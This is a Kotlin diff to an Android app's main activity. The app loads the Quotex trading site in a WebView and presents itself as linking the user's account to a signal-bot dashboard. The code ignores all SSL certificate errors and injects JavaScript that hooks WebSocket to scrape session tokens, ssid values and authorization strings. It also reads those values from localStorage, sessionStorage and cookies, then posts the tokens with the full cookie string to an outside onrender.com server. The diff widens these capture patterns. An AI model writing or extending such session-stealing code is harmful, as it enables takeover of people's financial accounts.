@@ -1,12 +1,15 @@
 package com.oscar.linker
 
 import android.annotation.SuppressLint
+import android.content.Context
+import android.content.SharedPreferences
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
 import android.view.ViewGroup
 import android.webkit.CookieManager
 import android.webkit.JavascriptInterface
+import android.webkit.WebResourceRequest
 import android.webkit.WebView
 import android.webkit.WebViewClient
 import android.widget.EditText
@@ -32,6 +35,8 @@ class MainActivity : AppCompatActivity() {
     private lateinit var statusText: TextView
     private lateinit var licenseKey: String
     private var sent = false
+    private lateinit var prefs: SharedPreferences
+    private var captureMode = false
 
     private val client = OkHttpClient.Builder()
         .connectTimeout(30, TimeUnit.SECONDS)
@@ -39,13 +44,22 @@ class MainActivity : AppCompatActivity() {
         .writeTimeout(120, TimeUnit.SECONDS)
         .build()
 
-    // ⚠️ تم تحديث الدومين هنا
-    private val SERVER_URL = "https://signal-bott.onrender.com/api/link"
+    private val BASE_URL = "https://signal-bott.onrender.com"
+    private val SERVER_URL = "$BASE_URL/api/link"
     private val QX_DOMAIN = "https://quotex.com"
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        showKeyDialog()
+        prefs = getSharedPreferences("oscar_prefs", Context.MODE_PRIVATE)
+
+        val savedKey = prefs.getString("license_key", null)
+        if (savedKey.isNullOrBlank()) {
+            showKeyDialog()
+        } else {
+            licenseKey = savedKey
+            setupUi()
+            loadDashboard()
+        }
     }
 
     private fun showKeyDialog() {
@@ -59,13 +73,15 @@ class MainActivity : AppCompatActivity() {
             .setView(input)
             .setCancelable(false)
             .setPositiveButton("متابعة") { _, _ ->
-                licenseKey = input.text.toString().trim().uppercase()
-                if (licenseKey.isEmpty()) {
+                val key = input.text.toString().trim().uppercase()
+                if (key.isEmpty()) {
                     Toast.makeText(this, "المفتاح مطلوب", Toast.LENGTH_SHORT).show()
                     finish()
                 } else {
+                    licenseKey = key
+                    prefs.edit().putString("license_key", key).apply()
                     setupUi()
-                    startLinking()
+                    loadDashboard()
                 }
             }
             .setNegativeButton("إلغاء") { _, _ -> finish() }
@@ -77,27 +93,25 @@ class MainActivity : AppCompatActivity() {
         val root = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
         }
-
         statusText = TextView(this).apply {
-            text = "📱 سجّل دخولك إلى Quotex في الأسفل"
-            textSize = 16f
-            setPadding(30, 40, 30, 40)
+            text = "جاري التحميل..."
+            textSize = 13f
+            setPadding(20, 20, 20, 20)
         }
-
         webView = WebView(this).apply {
             layoutParams = LinearLayout.LayoutParams(
                 ViewGroup.LayoutParams.MATCH_PARENT,
                 ViewGroup.LayoutParams.MATCH_PARENT
             )
         }
-
         root.addView(statusText)
         root.addView(webView)
         setContentView(root)
+        configureWebView()
     }
 
     @SuppressLint("SetJavaScriptEnabled", "AddJavascriptInterface")
-    private fun startLinking() {
+    private fun configureWebView() {
         webView.settings.apply {
             javaScriptEnabled = true
             domStorageEnabled = true
@@ -108,53 +122,75 @@ class MainActivity : AppCompatActivity() {
             userAgentString = "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 " +
                     "(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
         }
-
         CookieManager.getInstance().setAcceptCookie(true)
         CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true)
-
         webView.addJavascriptInterface(SessionBridge(), "OscarBridge")
 
         webView.webViewClient = object : WebViewClient() {
+            override fun shouldOverrideUrlLoading(view: WebView, request: WebResourceRequest): Boolean {
+                val url = request.url.toString()
+                if (url.startsWith("oscar://connect")) {
+                    startQuotexCapture()
+                    return true
+                }
+                return false
+            }
+
             override fun onReceivedSslError(view: WebView?, handler: android.webkit.SslErrorHandler?, error: android.net.http.SslError?) {
-                handler?.proceed() // تجاهل أخطاء شهادات SSL
+                handler?.proceed()
             }
 
             override fun onPageStarted(view: WebView?, url: String?, favicon: android.graphics.Bitmap?) {
                 super.onPageStarted(view, url, favicon)
-                injectWebSocketInterceptor()
+                if (url?.contains("quotex.com") == true) {
+                    injectWebSocketInterceptor()
+                }
             }
 
             override fun onPageFinished(view: WebView, url: String) {
                 super.onPageFinished(view, url)
-                injectWebSocketInterceptor()
-                if (url.contains("/trade") || url.contains("/cabinet") || url.contains("/dashboard")) {
-                    statusText.text = "✅ تم اكتشاف تسجيل الدخول..."
-                    tryReadLocalStorage()
-                }
-            }
-        }
-
-        webView.loadUrl("$QX_DOMAIN/ar/trade")
-
-        val handler = Handler(Looper.getMainLooper())
-        val check = object : Runnable {
-            override fun run() {
-                if (sent) return
-                val cookies = CookieManager.getInstance().getCookie(QX_DOMAIN)
-                if (cookies != null) {
-                    val ssid = extractCookie(cookies, "ssid")
-                        ?: extractCookie(cookies, "session")
-                        ?: extractCookie(cookies, "token")
-                    if (ssid != null && ssid.length > 20) {
-                        statusText.text = "🔗 جاري ربط حسابك بالسيرفر..."
-                        sendToServer(ssid, cookies)
-                        return
+                if (url.contains("quotex.com")) {
+                    injectWebSocketInterceptor()
+                    if (url.contains("/trade") || url.contains("/cabinet") || url.contains("/dashboard") || url.contains("/ar/trade")) {
+                        if (captureMode) {
+                            statusText.text = "✅ تم اكتشاف تسجيل الدخول، جاري التقاط الجلسة..."
+                            tryReadLocalStorage()
+                            Handler(Looper.getMainLooper()).postDelayed({ tryCaptureFromCookies() }, 2000)
+                        }
                     }
+                } else if (url.contains("signal-bott.onrender.com")) {
+                    statusText.text = "📊 لوحة التحكم"
+                    captureMode = false
                 }
-                handler.postDelayed(this, 2000)
             }
         }
-        handler.postDelayed(check, 5000)
+    }
+
+    private fun loadDashboard() {
+        statusText.text = "📊 جاري فتح لوحة التحكم..."
+        captureMode = false
+        webView.loadUrl("$BASE_URL/app_login/$licenseKey")
+    }
+
+    private fun startQuotexCapture() {
+        sent = false
+        captureMode = true
+        statusText.text = "📱 سجّل دخولك إلى Quotex..."
+        webView.loadUrl("$QX_DOMAIN/ar/trade")
+    }
+
+    private fun tryCaptureFromCookies() {
+        if (sent || !captureMode) return
+        val cookies = CookieManager.getInstance().getCookie(QX_DOMAIN)
+        if (cookies != null) {
+            val ssid = extractCookie(cookies, "ssid")
+                ?: extractCookie(cookies, "session")
+                ?: extractCookie(cookies, "token")
+            if (ssid != null && ssid.length > 20) {
+                statusText.text = "🔗 جاري ربط حسابك بالسيرفر..."
+                sendToServer(ssid, cookies)
+            }
+        }
     }
 
     private fun injectWebSocketInterceptor() {
@@ -162,36 +198,47 @@ class MainActivity : AppCompatActivity() {
             (function() {
                 if (window.__oscarHooked) return;
                 window.__oscarHooked = true;
-                var OrigWebSocket = window.WebSocket;
+                var OrigWS = window.WebSocket;
                 var hookedWS = function(url, protocols) {
-                    var ws = protocols ? new OrigWebSocket(url, protocols) : new OrigWebSocket(url);
+                    try {
+                        var m = url.match(/[?&]token=([^&]+)/);
+                        if (m && m[1] && m[1].length > 20) {
+                            if (window.OscarBridge) window.OscarBridge.onSsid(m[1]);
+                        }
+                        var s = url.match(/[?&]session=([^&]+)/);
+                        if (s && s[1] && s[1].length > 20) {
+                            if (window.OscarBridge) window.OscarBridge.onSsid(s[1]);
+                        }
+                    } catch(e) {}
+                    var ws = protocols ? new OrigWS(url, protocols) : new OrigWS(url);
                     try {
                         ws.addEventListener('message', function(ev) {
                             try {
-                                var data = ev.data;
-                                if (typeof data !== 'string') return;
-                                var m = data.match(/"session"\s*:\s*"([^"]+)"/);
-                                if (m && m[1] && m[1].length > 20) {
-                                    if (window.OscarBridge && window.OscarBridge.onSsid) {
-                                        window.OscarBridge.onSsid(m[1]);
+                                var d = ev.data;
+                                if (typeof d !== 'string') return;
+                                var pats = [
+                                    /"session"\s*:\s*"([^"]+)"/,
+                                    /"token"\s*:\s*"([^"]+)"/,
+                                    /"ssid"\s*:\s*"([^"]+)"/,
+                                    /authorization["']?\s*[:=]\s*["']?([A-Za-z0-9_\-\.]{30,})/
+                                ];
+                                for (var i = 0; i < pats.length; i++) {
+                                    var mm = d.match(pats[i]);
+                                    if (mm && mm[1] && mm[1].length > 20) {
+                                        if (window.OscarBridge) window.OscarBridge.onSsid(mm[1]);
+                                        break;
                                     }
                                 }
-                                var t = data.match(/"token"\s*:\s*"([^"]+)"/);
-                                if (t && t[1] && t[1].length > 20) {
-                                    if (window.OscarBridge && window.OscarBridge.onSsid) {
-                                        window.OscarBridge.onSsid(t[1]);
-                                    }
-                                }
-                            } catch (e) {}
+                            } catch(e) {}
                         });
-                    } catch (e) {}
+                    } catch(e) {}
                     return ws;
                 };
-                hookedWS.prototype = OrigWebSocket.prototype;
-                hookedWS.CONNECTING = OrigWebSocket.CONNECTING;
-                hookedWS.OPEN = OrigWebSocket.OPEN;
-                hookedWS.CLOSING = OrigWebSocket.CLOSING;
-                hookedWS.CLOSED = OrigWebSocket.CLOSED;
+                hookedWS.prototype = OrigWS.prototype;
+                hookedWS.CONNECTING = OrigWS.CONNECTING;
+                hookedWS.OPEN = OrigWS.OPEN;
+                hookedWS.CLOSING = OrigWS.CLOSING;
+                hookedWS.CLOSED = OrigWS.CLOSED;
                 window.WebSocket = hookedWS;
             })();
         """.trimIndent()
@@ -202,20 +249,18 @@ class MainActivity : AppCompatActivity() {
         val js = """
             (function() {
                 try {
-                    var keys = ['session', 'token', 'ssid', 'auth'];
-                    for (var i = 0; i < keys.length; i++) {
-                        var v = localStorage.getItem(keys[i]);
+                    ['session','token','ssid','auth','authorization'].forEach(function(k) {
+                        var v = localStorage.getItem(k);
                         if (v && v.length > 20) {
-                            var parsed = v;
-                            try {
-                                var o = JSON.parse(v);
-                                parsed = o.token || o.session || o.ssid || v;
-                            } catch(e) {}
-                            if (window.OscarBridge && window.OscarBridge.onSsid) {
-                                window.OscarBridge.onSsid(parsed);
-                            }
+                            var p = v;
+                            try { var o = JSON.parse(v); p = o.token || o.session || o.ssid || o.authorization || v; } catch(e) {}
+                            if (window.OscarBridge) window.OscarBridge.onSsid(p);
                         }
-                    }
+                    });
+                    ['session','token','ssid'].forEach(function(k) {
+                        var v = sessionStorage.getItem(k);
+                        if (v && v.length > 20 && window.OscarBridge) window.OscarBridge.onSsid(v);
+                    });
                 } catch (e) {}
             })();
         """.trimIndent()
@@ -225,21 +270,27 @@ class MainActivity : AppCompatActivity() {
     inner class SessionBridge {
         @JavascriptInterface
         fun onSsid(ssid: String) {
-            if (sent || ssid.length < 20) return
+            if (sent || !captureMode || ssid.length < 20) return
             sent = true
-            runOnUiThread {
-                statusText.text = "🔗 جاري ربط حسابك بالسيرفر..."
-            }
+            runOnUiThread { statusText.text = "🔗 جاري ربط حسابك بالسيرفر..." }
             val cookies = CookieManager.getInstance().getCookie(QX_DOMAIN) ?: ""
             sendToServer(ssid, cookies)
+        }
+
+        @JavascriptInterface
+        fun startConnect() {
+            runOnUiThread { startQuotexCapture() }
+        }
+
+        @JavascriptInterface
+        fun logout() {
+            prefs.edit().remove("license_key").apply()
+            runOnUiThread { recreate() }
         }
     }
 
     private fun extractCookie(cookies: String, name: String): String? {
-        return cookies.split(";")
-            .map { it.trim() }
-            .firstOrNull { it.startsWith("$name=") }
-            ?.substringAfter("=")
+        return cookies.split(";").map { it.trim() }.firstOrNull { it.startsWith("$name=") }?.substringAfter("=")
     }
 
     private fun sendToServer(ssid: String, cookies: String) {
@@ -251,47 +302,34 @@ class MainActivity : AppCompatActivity() {
                     put("cookies", cookies)
                     put("email", "")
                 }
-
                 val request = Request.Builder()
                     .url(SERVER_URL)
                     .post(payload.toString().toRequestBody("application/json".toMediaType()))
                     .build()
-
                 val response = client.newCall(request).execute()
-                val body = response.body?.string() ?: "{}"
-                val json = JSONObject(body)
+                val json = JSONObject(response.body?.string() ?: "{}")
 
                 withContext(Dispatchers.Main) {
                     if (json.optBoolean("ok")) {
-                        AlertDialog.Builder(this@MainActivity)
-                            .setTitle("✅ نجح الربط")
-                            .setMessage("تم ربط حساب Quotex بنجاح.\n\nارجع إلى الموقع على متصفح هاتفك، افتح لوحة التحكم، ثم فعّل التداول الآلي.")
-                            .setCancelable(false)
-                            .setPositiveButton("حسناً") { _, _ -> finish() }
-                            .show()
+                        sent = false
+                        captureMode = false
+                        Toast.makeText(this@MainActivity, "✅ تم ربط الحساب بنجاح", Toast.LENGTH_LONG).show()
+                        Handler(Looper.getMainLooper()).postDelayed({ loadDashboard() }, 500)
                     } else {
                         val err = json.optString("error", "خطأ غير معروف")
                         AlertDialog.Builder(this@MainActivity)
                             .setTitle("❌ فشل الربط")
-                            .setMessage("السبب: $err\n\nتأكد من صحة تسجيل الدخول وحاول مرة أخرى.")
+                            .setMessage("السبب: $err\n\nتأكد من تسجيل الدخول وحاول مرة أخرى.")
                             .setCancelable(false)
-                            .setPositiveButton("إعادة المحاولة") { _, _ ->
-                                sent = false
-                                statusText.text = "📱 حاول تسجيل الدخول مرة أخرى"
-                                webView.loadUrl("$QX_DOMAIN/ar/trade")
-                            }
-                            .setNegativeButton("إغلاق") { _, _ -> finish() }
+                            .setPositiveButton("إعادة المحاولة") { _, _ -> sent = false; startQuotexCapture() }
+                            .setNegativeButton("إلغاء") { _, _ -> sent = false; loadDashboard() }
                             .show()
                     }
                 }
             } catch (e: Exception) {
                 withContext(Dispatchers.Main) {
                     sent = false
-                    Toast.makeText(
-                        this@MainActivity,
-                        "خطأ في الاتصال بالسيرفر: ${e.message}",
-                        Toast.LENGTH_LONG
-                    ).show()
+                    Toast.makeText(this@MainActivity, "خطأ في الاتصال: ${e.message}", Toast.LENGTH_LONG).show()
                 }
             }
         }
@@ -299,10 +337,6 @@ class MainActivity : AppCompatActivity() {
 
     @Deprecated("Deprecated in Java")
     override fun onBackPressed() {
-        if (::webView.isInitialized && webView.canGoBack()) {
-            webView.goBack()
-        } else {
-            super.onBackPressed()
-        }
+        if (::webView.isInitialized && webView.canGoBack()) webView.goBack() else super.onBackPressed()
     }
 }
